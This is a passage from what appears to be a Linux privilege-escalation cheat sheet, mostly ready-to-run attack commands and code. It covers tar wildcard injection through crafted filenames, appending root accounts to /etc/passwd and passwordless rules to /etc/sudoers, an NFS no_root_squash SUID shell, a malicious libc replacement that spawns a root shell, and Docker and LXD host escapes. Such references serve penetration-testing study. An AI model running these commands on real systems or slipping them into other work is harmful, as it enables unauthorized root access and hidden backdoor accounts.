<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="c"># create file for exploitation</span>
<a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="n">touch</span> <span class="p">--</span> <span class="s2">&quot;--checkpoint=1&quot;</span>
<a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="n">touch</span> <span class="p">--</span> <span class="s2">&quot;--checkpoint-action=exec=sh shell.sh&quot;</span>
<a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="nb">echo </span><span class="s2">&quot;#\!/bin/bash\ncat /etc/passwd &gt; /tmp/flag\nchmod 777 /tmp/flag&quot;</span> <span class="p">&gt;</span> <span class="n">shell</span><span class="p">.</span><span class="n">sh</span>
<a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>
<a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a><span class="c"># vulnerable script</span>
<a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a><span class="n">tar</span> <span class="n">cf</span> <span class="n">archive</span><span class="p">.</span><span class="n">tar</span> <span class="p">*</span>
</code></pre></div>
<p>Tool: <a href="https://github.com/localh0t/wildpwn">wildpwn</a></p>
<h2 id="writable-files">Writable files</h2>
<p>List world writable files on the system.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="n">find</span> <span class="p">/</span> <span class="n">-writable</span> <span class="p">!</span> <span class="n">-user</span> <span class="p">`</span><span class="n">whoami</span><span class="p">`</span> <span class="n">-type</span> <span class="n">f</span> <span class="p">!</span> <span class="n">-path</span> <span class="s2">&quot;/proc/*&quot;</span> <span class="p">!</span> <span class="n">-path</span> <span class="s2">&quot;/sys/*&quot;</span> <span class="n">-exec</span> <span class="nb">ls </span><span class="n">-al</span> <span class="p">{}</span> <span class="p">\;</span> <span class="n">2</span><span class="p">&gt;/</span><span class="n">dev</span><span class="p">/</span><span class="n">null</span>
<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="n">find</span> <span class="p">/</span> <span class="n">-perm</span> <span class="p">-</span><span class="n">2</span> <span class="n">-type</span> <span class="n">f</span> <span class="n">2</span><span class="p">&gt;/</span><span class="n">dev</span><span class="p">/</span><span class="n">null</span>
<a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="n">find</span> <span class="p">/</span> <span class="p">!</span> <span class="n">-path</span> <span class="s2">&quot;*/proc/*&quot;</span> <span class="n">-perm</span> <span class="p">-</span><span class="n">2</span> <span class="n">-type</span> <span class="n">f</span> <span class="n">-print</span> <span class="n">2</span><span class="p">&gt;/</span><span class="n">dev</span><span class="p">/</span><span class="n">null</span>
</code></pre></div>
<h3 id="writable-etcsysconfignetwork-scripts-centosredhat">Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)</h3>
<p>/etc/sysconfig/network-scripts/ifcfg-1337 for example</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="n">NAME</span><span class="p">=</span><span class="n">Network</span> <span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">id</span>  <span class="p">&amp;</span><span class="n">lt</span><span class="p">;=</span> <span class="n">Note</span> <span class="n">the</span> <span class="n">blank</span> <span class="n">space</span>
<a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="n">ONBOOT</span><span class="p">=</span><span class="n">yes</span>
<a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="n">DEVICE</span><span class="p">=</span><span class="n">eth0</span>
<a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>
<a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="n">EXEC</span> <span class="p">:</span>
<a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a><span class="p">./</span><span class="n">etc</span><span class="p">/</span><span class="n">sysconfig</span><span class="p">/</span><span class="n">network-scripts</span><span class="p">/</span><span class="n">ifcfg</span><span class="p">-</span><span class="n">1337</span>
</code></pre></div>
src : <a href="https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f">https://vulmon.com/exploitdetailsqidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f</a></p>
<h3 id="writable-etcpasswd">Writable /etc/passwd</h3>
<p>First generate a password with one of the following commands.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="n">openssl</span> <span class="n">passwd</span> <span class="p">-</span><span class="n">1</span> <span class="n">-salt</span> <span class="n">hacker</span> <span class="n">hacker</span>
<a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="n">mkpasswd</span> <span class="n">-m</span> <span class="n">SHA</span><span class="p">-</span><span class="n">512</span> <span class="n">hacker</span>
<a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a><span class="n">python2</span> <span class="n">-c</span> <span class="s1">&#39;import crypt; print crypt.crypt(&quot;hacker&quot;, &quot;$6$salt&quot;)&#39;</span>
</code></pre></div>
<p>Then add the user <code>hacker</code> and add the generated password.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="n">hacker</span><span class="p">:</span><span class="n">GENERATED_PASSWORD_HERE</span><span class="p">:</span><span class="n">0</span><span class="p">:</span><span class="n">0</span><span class="p">:</span><span class="n">Hacker</span><span class="p">:/</span><span class="n">root</span><span class="p">:/</span><span class="n">bin</span><span class="p">/</span><span class="n">bash</span>
</code></pre></div>
<p>E.g: <code>hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash</code></p>
<p>You can now use the <code>su</code> command with <code>hacker:hacker</code></p>
<p>Alternatively you can use the following lines to add a dummy user without a password.  <br />
WARNING: you might degrade the current security of the machine.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="nb">echo </span><span class="s1">&#39;dummy::0:0::/root:/bin/bash&#39;</span> <span class="p">&gt;&gt;/</span><span class="n">etc</span><span class="p">/</span><span class="n">passwd</span>
<a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="n">su</span> <span class="p">-</span> <span class="n">dummy</span>
</code></pre></div>
<p>NOTE: In BSD platforms <code>/etc/passwd</code> is located at <code>/etc/pwd.db</code> and <code>/etc/master.passwd</code>, also the <code>/etc/shadow</code> is renamed to <code>/etc/spwd.db</code>. </p>
<h3 id="writable-etcsudoers">Writable /etc/sudoers</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="nb">echo </span><span class="s2">&quot;username ALL=(ALL:ALL) ALL&quot;</span><span class="p">&gt;&gt;/</span><span class="n">etc</span><span class="p">/</span><span class="n">sudoers</span>
<a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>
<a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a><span class="c"># use SUDO without password</span>
<a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a><span class="nb">echo </span><span class="s2">&quot;username ALL=(ALL) NOPASSWD: ALL&quot;</span> <span class="p">&gt;&gt;/</span><span class="n">etc</span><span class="p">/</span><span class="n">sudoers</span>
<a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a><span class="nb">echo </span><span class="s2">&quot;username ALL=NOPASSWD: /bin/bash&quot;</span> <span class="p">&gt;&gt;/</span><span class="n">etc</span><span class="p">/</span><span class="n">sudoers</span>
</code></pre></div>
<h2 id="nfs-root-squashing">NFS Root Squashing</h2>
<p>When <strong>no_root_squash</strong> appears in <code>/etc/exports</code>, the folder is shareable and a remote user can mount it.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="c"># remote check the name of the folder</span>
<a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="n">showmount</span> <span class="n">-e</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span>
<a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>
<a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="c"># create dir</span>
<a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="n">mkdir</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">nfsdir</span>  
<a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>
<a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a><span class="c"># mount directory </span>
<a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a><span class="nb">mount </span><span class="n">-t</span> <span class="n">nfs</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">:/</span><span class="n">shared</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">nfsdir</span>    
<a id="__codelineno-38-9" name="__codelineno-38-9" href="#__codelineno-38-9"></a><span class="nb">cd </span><span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">nfsdir</span>
<a id="__codelineno-38-10" name="__codelineno-38-10" href="#__codelineno-38-10"></a>
<a id="__codelineno-38-11" name="__codelineno-38-11" href="#__codelineno-38-11"></a><span class="c"># copy wanted shell </span>
<a id="__codelineno-38-12" name="__codelineno-38-12" href="#__codelineno-38-12"></a><span class="nb">cp </span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">bash</span> <span class="p">.</span>  
<a id="__codelineno-38-13" name="__codelineno-38-13" href="#__codelineno-38-13"></a>
<a id="__codelineno-38-14" name="__codelineno-38-14" href="#__codelineno-38-14"></a><span class="c"># set suid permission</span>
<a id="__codelineno-38-15" name="__codelineno-38-15" href="#__codelineno-38-15"></a><span class="n">chmod</span> <span class="p">+</span><span class="n">s</span> <span class="n">bash</span>   
</code></pre></div>
<h2 id="shared-library">Shared Library</h2>
<h3 id="ldconfig">ldconfig</h3>
<p>Identify shared libraries with <code>ldd</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="p">$</span> <span class="n">ldd</span> <span class="p">/</span><span class="n">opt</span><span class="p">/</span><span class="n">binary</span>
<a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>    <span class="n">linux-vdso</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="n">1</span> <span class="p">(</span><span class="n">0x00007ffe961cd000</span><span class="p">)</span>
<a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>    <span class="n">vulnlib</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="n">8</span> <span class="p">=&gt;</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">lib</span><span class="p">/</span><span class="n">vulnlib</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="n">8</span> <span class="p">(</span><span class="n">0x00007fa55e55a000</span><span class="p">)</span>
<a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>    <span class="p">/</span><span class="n">lib64</span><span class="p">/</span><span class="n">ld-linux-x86</span><span class="p">-</span><span class="n">64</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="n">2</span> <span class="p">=&gt;</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">lib64</span><span class="p">/</span><span class="n">ld-linux-x86</span><span class="p">-</span><span class="n">64</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="n">2</span> <span class="p">(</span><span class="n">0x00007fa55e6c8000</span><span class="p">)</span>        
</code></pre></div>
<p>Create a library in <code>/tmp</code> and activate the path.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="n">gcc</span> <span class="err"></span><span class="n">Wall</span> <span class="err"></span><span class="n">fPIC</span> <span class="err"></span><span class="n">shared</span> <span class="err"></span><span class="n">o</span> <span class="n">vulnlib</span><span class="p">.</span><span class="n">so</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">vulnlib</span><span class="p">.</span><span class="n">c</span>
<a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="nb">echo </span><span class="s2">&quot;/tmp/&quot;</span> <span class="p">&gt;</span> <span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">ld</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="n">conf</span><span class="p">.</span><span class="n">d</span><span class="p">/</span><span class="n">exploit</span><span class="p">.</span><span class="n">conf</span> <span class="p">&amp;&amp;</span> <span class="n">ldconfig</span> <span class="n">-l</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">vulnlib</span><span class="p">.</span><span class="n">so</span>
<a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a><span class="p">/</span><span class="n">opt</span><span class="p">/</span><span class="n">binary</span>
</code></pre></div>
<h3 id="rpath">RPATH</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="n">level15</span><span class="nv">@nebula</span><span class="p">:/</span><span class="n">home</span><span class="p">/</span><span class="n">flag15</span><span class="p">$</span> <span class="n">readelf</span> <span class="n">-d</span> <span class="n">flag15</span> <span class="p">|</span> <span class="n">egrep</span> <span class="s2">&quot;NEEDED|RPATH&quot;</span>
<a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a> <span class="n">0x00000001</span> <span class="p">(</span><span class="n">NEEDED</span><span class="p">)</span>                     <span class="n">Shared</span> <span class="n">library</span><span class="p">:</span> <span class="no">[libc.so.6]</span>
<a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a> <span class="n">0x0000000f</span> <span class="p">(</span><span class="n">RPATH</span><span class="p">)</span>                      <span class="n">Library</span> <span class="n">rpath</span><span class="p">:</span> <span class="p">[/</span><span class="n">var</span><span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">flag15</span><span class="p">]</span>
<a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a>
<a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a><span class="n">level15</span><span class="nv">@nebula</span><span class="p">:/</span><span class="n">home</span><span class="p">/</span><span class="n">flag15</span><span class="p">$</span> <span class="n">ldd</span> <span class="p">./</span><span class="n">flag15</span> 
<a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a> <span class="n">linux-gate</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="n">1</span> <span class="p">=&gt;</span>  <span class="p">(</span><span class="n">0x0068c000</span><span class="p">)</span>
<a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a> <span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="n">6</span> <span class="p">=&gt;</span> <span class="p">/</span><span class="n">lib</span><span class="p">/</span><span class="n">i386-linux-gnu</span><span class="p">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="n">6</span> <span class="p">(</span><span class="n">0x00110000</span><span class="p">)</span>
<a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a> <span class="p">/</span><span class="n">lib</span><span class="p">/</span><span class="n">ld-linux</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="n">2</span> <span class="p">(</span><span class="n">0x005bb000</span><span class="p">)</span>
</code></pre></div>
<p>By copying the lib into <code>/var/tmp/flag15/</code> it will be used by the program in this place as specified in the <code>RPATH</code> variable.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="n">level15</span><span class="nv">@nebula</span><span class="p">:/</span><span class="n">home</span><span class="p">/</span><span class="n">flag15</span><span class="p">$</span> <span class="nb">cp </span><span class="p">/</span><span class="n">lib</span><span class="p">/</span><span class="n">i386-linux-gnu</span><span class="p">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="n">6</span> <span class="p">/</span><span class="n">var</span><span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">flag15</span><span class="p">/</span>
<a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>
<a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a><span class="n">level15</span><span class="nv">@nebula</span><span class="p">:/</span><span class="n">home</span><span class="p">/</span><span class="n">flag15</span><span class="p">$</span> <span class="n">ldd</span> <span class="p">./</span><span class="n">flag15</span> 
<a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a> <span class="n">linux-gate</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="n">1</span> <span class="p">=&gt;</span>  <span class="p">(</span><span class="n">0x005b0000</span><span class="p">)</span>
<a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a> <span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="n">6</span> <span class="p">=&gt;</span> <span class="p">/</span><span class="n">var</span><span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">flag15</span><span class="p">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="n">6</span> <span class="p">(</span><span class="n">0x00110000</span><span class="p">)</span>
<a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a> <span class="p">/</span><span class="n">lib</span><span class="p">/</span><span class="n">ld-linux</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="n">2</span> <span class="p">(</span><span class="n">0x00737000</span><span class="p">)</span>
</code></pre></div>
<p>Then create an evil library in <code>/var/tmp</code> with <code>gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="c">#include&lt;stdlib.h&gt;</span>
<a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="c">#define SHELL &quot;/bin/sh&quot;</span>
<a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>
<a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="n">int</span> <span class="n">__libc_start_main</span><span class="p">(</span><span class="n">int</span> <span class="p">(*</span><span class="n">main</span><span class="p">)</span> <span class="p">(</span><span class="n">int</span><span class="p">,</span> <span class="n">char</span> <span class="p">**,</span> <span class="n">char</span> <span class="p">**),</span> <span class="n">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">char</span> <span class="p">**</span> <span class="n">ubp_av</span><span class="p">,</span> <span class="n">void</span> <span class="p">(*</span><span class="n">init</span><span class="p">)</span> <span class="p">(</span><span class="n">void</span><span class="p">),</span> <span class="n">void</span> <span class="p">(*</span><span class="n">fini</span><span class="p">)</span> <span class="p">(</span><span class="n">void</span><span class="p">),</span> <span class="n">void</span> <span class="p">(*</span><span class="n">rtld_fini</span><span class="p">)</span> <span class="p">(</span><span class="n">void</span><span class="p">),</span> <span class="n">void</span> <span class="p">(*</span> <span class="n">stack_end</span><span class="p">))</span>
<a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a><span class="p">{</span>
<a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a> <span class="n">char</span> <span class="p">*</span><span class="n">file</span> <span class="p">=</span> <span class="n">SHELL</span><span class="p">;</span>
<a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a> <span class="n">char</span> <span class="p">*</span><span class="n">argv</span><span class="p">[]</span> <span class="p">=</span> <span class="p">{</span><span class="n">SHELL</span><span class="p">,</span><span class="n">0</span><span class="p">};</span>
<a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a> <span class="n">setresuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
<a id="__codelineno-43-9" name="__codelineno-43-9" href="#__codelineno-43-9"></a> <span class="n">execve</span><span class="p">(</span><span class="n">file</span><span class="p">,</span><span class="n">argv</span><span class="p">,</span><span class="n">0</span><span class="p">);</span>
<a id="__codelineno-43-10" name="__codelineno-43-10" href="#__codelineno-43-10"></a><span class="p">}</span>
</code></pre></div>
<h2 id="groups">Groups</h2>
<h3 id="docker">Docker</h3>
<p>Mount the filesystem in a bash container, allowing you to edit the <code>/etc/passwd</code> as root, then add a backdoor account <code>toor:password</code>.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>$&gt;<span class="w"> </span>docker<span class="w"> </span>run<span class="w"> </span>-it<span class="w"> </span>--rm<span class="w"> </span>-v<span class="w"> </span><span class="nv">$PWD</span>:/mnt<span class="w"> </span>bash
<a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>$&gt;<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/mnt/etc/passwd
</code></pre></div>
<p>Almost similar but you will also see all processes running on the host and be connected to the same NICs.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="n">docker</span> <span class="n">run</span> <span class="p">-</span><span class="n">-rm</span> <span class="n">-it</span> <span class="p">-</span><span class="n">-pid</span><span class="p">=</span><span class="n">host</span> <span class="p">-</span><span class="n">-net</span><span class="p">=</span><span class="n">host</span> <span class="p">-</span><span class="n">-privileged</span> <span class="n">-v</span> <span class="p">/:/</span><span class="n">host</span> <span class="n">ubuntu</span> <span class="n">bash</span>
</code></pre></div>
<p>Or use the following docker image from <a href="https://hub.docker.com/r/chrisfosterelli/rootplease/">chrisfosterelli</a> to spawn a root shell</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="p">$</span> <span class="n">docker</span> <span class="n">run</span> <span class="n">-v</span> <span class="p">/:/</span><span class="n">hostOS</span> <span class="n">-i</span> <span class="n">-t</span> <span class="n">chrisfosterelli</span><span class="p">/</span><span class="n">rootplease</span>
<a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="n">latest</span><span class="p">:</span> <span class="n">Pulling</span> <span class="n">from</span> <span class="n">chrisfosterelli</span><span class="p">/</span><span class="n">rootplease</span>
<a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a><span class="n">2de59b831a23</span><span class="p">:</span> <span class="n">Pull</span> <span class="n">complete</span> 
<a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a><span class="n">354c3661655e</span><span class="p">:</span> <span class="n">Pull</span> <span class="n">complete</span> 
<a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a><span class="n">91930878a2d7</span><span class="p">:</span> <span class="n">Pull</span> <span class="n">complete</span> 
<a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a><span class="n">a3ed95caeb02</span><span class="p">:</span> <span class="n">Pull</span> <span class="n">complete</span> 
<a id="__codelineno-46-7" name="__codelineno-46-7" href="#__codelineno-46-7"></a><span class="n">489b110c54dc</span><span class="p">:</span> <span class="n">Pull</span> <span class="n">complete</span> 
<a id="__codelineno-46-8" name="__codelineno-46-8" href="#__codelineno-46-8"></a><span class="n">Digest</span><span class="p">:</span> <span class="n">sha256</span><span class="p">:</span><span class="n">07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0</span>
<a id="__codelineno-46-9" name="__codelineno-46-9" href="#__codelineno-46-9"></a><span class="n">Status</span><span class="p">:</span> <span class="n">Downloaded</span> <span class="n">newer</span> <span class="n">image</span> <span class="k">for</span> <span class="n">chrisfosterelli</span><span class="p">/</span><span class="n">rootplease</span><span class="p">:</span><span class="n">latest</span>
<a id="__codelineno-46-10" name="__codelineno-46-10" href="#__codelineno-46-10"></a>
<a id="__codelineno-46-11" name="__codelineno-46-11" href="#__codelineno-46-11"></a><span class="n">You</span> <span class="n">should</span> <span class="n">now</span> <span class="n">have</span> <span class="n">a</span> <span class="n">root</span> <span class="n">shell</span> <span class="n">on</span> <span class="n">the</span> <span class="n">host</span> <span class="n">OS</span>
<a id="__codelineno-46-12" name="__codelineno-46-12" href="#__codelineno-46-12"></a><span class="n">Press</span> <span class="n">Ctrl-D</span> <span class="n">to</span> <span class="n">exit</span> <span class="n">the</span> <span class="n">docker</span> <span class="n">instance</span> <span class="p">/</span> <span class="n">shell</span>
<a id="__codelineno-46-13" name="__codelineno-46-13" href="#__codelineno-46-13"></a>
<a id="__codelineno-46-14" name="__codelineno-46-14" href="#__codelineno-46-14"></a><span class="n">sh</span><span class="p">-</span><span class="n">5</span><span class="p">.</span><span class="n">0</span><span class="c"># id</span>
<a id="__codelineno-46-15" name="__codelineno-46-15" href="#__codelineno-46-15"></a><span class="n">uid</span><span class="p">=</span><span class="n">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="p">=</span><span class="n">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="p">=</span><span class="n">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
</code></pre></div>
<p>More docker privilege escalation using the Docker Socket.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="n">sudo</span> <span class="n">docker</span> <span class="n">-H</span> <span class="n">unix</span><span class="p">:///</span><span class="n">google</span><span class="p">/</span><span class="n">host</span><span class="p">/</span><span class="n">var</span><span class="p">/</span><span class="n">run</span><span class="p">/</span><span class="n">docker</span><span class="p">.</span><span class="n">sock</span> <span class="n">run</span> <span class="n">-v</span> <span class="p">/:/</span><span class="n">host</span> <span class="n">-it</span> <span class="n">ubuntu</span> <span class="n">chroot</span> <span class="p">/</span><span class="n">host</span> <span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">bash</span>
<a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a><span class="n">sudo</span> <span class="n">docker</span> <span class="n">-H</span> <span class="n">unix</span><span class="p">:///</span><span class="n">google</span><span class="p">/</span><span class="n">host</span><span class="p">/</span><span class="n">var</span><span class="p">/</span><span class="n">run</span><span class="p">/</span><span class="n">docker</span><span class="p">.</span><span class="n">sock</span> <span class="n">run</span> <span class="n">-it</span> <span class="p">-</span><span class="n">-privileged</span> <span class="p">-</span><span class="n">-pid</span><span class="p">=</span><span class="n">host</span> <span class="n">debian</span> <span class="n">nsenter</span> <span class="n">-t</span> <span class="n">1</span> <span class="n">-m</span> <span class="n">-u</span> <span class="n">-n</span> <span class="n">-i</span> <span class="n">sh</span>
</code></pre></div>
<h3 id="lxclxd">LXC/LXD</h3>
<p>The privesc requires to run a container with elevated privileges and mount the host filesystem inside.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="err"></span><span class="n">swissky</span><span class="nv">@lab</span> <span class="p">~</span>  
<a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="err"></span><span class="p">$</span> <span class="n">id</span>
<a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a><span class="n">uid</span><span class="p">=</span><span class="n">1000</span><span class="p">(</span><span class="n">swissky</span><span class="p">)</span> <span class="n">gid</span><span class="p">=</span><span class="n">1000</span><span class="p">(</span><span class="n">swissky</span><span class="p">)</span> <span class="n">groupes</span><span class="p">=</span><span class="n">1000</span><span class="p">(</span><span class="n">swissky</span><span class="p">),</span><span class="n">3</span><span class="p">(</span><span class="n">sys</span><span class="p">),</span><span class="n">90</span><span class="p">(</span><span class="n">network</span><span class="p">),</span><span class="n">98</span><span class="p">(</span><span class="n">power</span><span class="p">),</span><span class="n">110</span><span class="p">(</span><span class="n">lxd</span><span class="p">),</span><span class="n">991</span><span class="p">(</span><span class="n">lp</span><span class="p">),</span><span class="n">998</span><span class="p">(</span><span class="n">wheel</span><span class="p">)</span>
</code></pre></div>
<p>Build an Alpine image and start it using the flag <code>security.privileged=true</code>, forcing the container to interact as root with the host filesystem.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="c"># build a simple alpine image</span>
